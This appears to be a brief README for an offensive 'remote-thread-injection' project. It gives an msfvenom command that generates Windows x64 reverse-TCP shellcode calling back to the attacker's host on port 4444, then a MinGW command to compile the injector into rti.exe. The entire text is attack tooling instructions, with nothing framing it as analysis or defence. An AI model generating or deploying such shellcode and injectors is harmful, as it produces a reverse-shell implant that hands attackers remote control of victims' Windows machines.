# remote-thread-injection
create your shellcode and insert it in code:
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -b '\x00\x0a\x0d' -f c
```

compile it in kali using **MinGW**:
```sh
x86_64-w64-mingw32-gcc remote_thread_injection_1.c -o rti.exe
```
